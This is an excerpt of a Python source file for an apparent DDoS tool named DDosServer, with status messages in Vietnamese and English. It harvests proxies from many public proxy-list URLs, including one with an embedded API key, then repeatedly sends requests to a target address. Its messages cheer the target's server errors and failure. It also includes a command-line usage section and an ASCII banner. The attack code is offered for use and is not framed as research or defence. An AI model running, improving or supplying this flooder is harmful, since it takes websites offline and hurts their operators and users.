...
class DDoS:
    def __init__(self, ip, delay, proxies=False):
        ...
        nurls = ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt", "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1",
                 "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1/2",
                 "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1/3", "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1/4",
                 "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks4&lastchecked=60",
                 "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1/5",
                 "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",          
                 "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1/6", "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1/7"
                 "https://www.proxy-list.download/api/v1/get?type=socks4",
                 "https://www.proxyscan.io/download?type=socks4",
                 "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
                 "https://www.proxyscan.io/download?type=socks5",
                 "https://www.socks-proxy.net/", "http://www.aliveproxy.com/high-anonymity-proxy-list/", "http://www.aliveproxy.com/anonymous-proxy-list/",
                 ...
                 "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1/8",
                 "http://free-proxy.cz/en/proxylist/country/all/all/ping/level1/9",
                 "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"]
        if self.proxies:
            ...
            self.proxyget2(url)
            print("\x1b[1;33m[+] Downloading \x1b[1;34mProxy......")
            ...
            for position, url in enumerate(foxtools):
                self.proxyget(url)
            print("\x1b[1;36m[+] Current IPs in proxylist: %s" % (len(open("proxy.txt").readlines())))
    ...
    def ddos(self):
        try:
            ...
            if self.proxies:
                print(
                    f"\x1b[1;91m[+] \x1b[1;93mĐang \x1b[1;36mRequest \x1b[1;97mSent \x1b[1;33mĐến \x1b[1;91mServer. \x1b[1;93mThay \x1b[1;36mĐổi \x1b[1;97mProxy: \x1b[1;33m{print_prox} \x1b[1;91m---> \x1b[1;93mVui \x1b[1;36mLòng \x1b[1;97mChờ \x1b[1;33mSever \x1b[1;91mError.")
            else:
                print(" \x1b[1;93m[+] Attack Server ---> Vui Lòng Chờ Sever Error.")
            code = 200
            ...
            if "500" in str(e):
                print("\x1b[1;91m[+] Internal Server Error ---> Server Đã Ăn DDos!")
                code = 500
            elif "429" in str(e):
                print("\x1b[1;91m[+]  Requests Error ---> Server Có Thể Được Bảo Vệ Bởi Tường Lửa.")
                code = 500
            elif "403" in str(e):
                print("\x1b[1;32m[+] Server Forbids Access ---> Đang Tấn Công Miền Phụ.")
            elif code.startswith('5'):
                print("\x1b[1;91m[+] Server Has Returned An Error ---> Server May Be Down!")
                code = 500
            elif code.startswith('4'):
                print("\x1b[1;91qm[+] Client Error ---> Possibly Defective Http Request.")
        except urllib.error.URLError as e:
            if "A connection attempt failed" in str(e):
                print("\x1b[1;91m[+] Time Out Error ---> Server May Be Down(checking Server Is Suggested)!")
                code = 500
        except ConnectionResetError as e:
            print("\x1b[1;91m[+] Server Closed Connection ---> Sever Được Bảo Vệ Bởi Tường Lửa .")
        except LookupError:
            pass
...
░▒████▓ ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄
 ...
 ░               ░               
    ...
    def usage(self):
        print("""
\x1b[1;91m[+] Option-Parsing Help:
\x1b[1;93m[+] -t, --target   - Specify target address(has to be an http: link).
\x1b[1;36m[+] -d, --delay    - Specify delay for each request.
\x1b[1;97m[+] -p, --proxy    - Specify whether proxies are used or not.

\x1b[1;33m[+] Usage:""")
        if sys.argv[0].endswith(".py"):
            print("""\x1b[1;95m[+] python3 DDosServer.py -t <ipaddr> -d <delay> -p
\x1b[1;32m[+] python3 DDosServer.py -i
            """)
        else:
            print("""[+] DDosServer -t <ipaddr> -d <delay> -p
[+] DDosSever """)
    def parse_args(self):
        opts = OptionParser()
        ...
        if opt.delay is not None:
            try:
                ...
                print("\x1b[1;39m[+] Delay must be a number!")
                self.usage()
                sys.exit()
        else:
            delay = 0
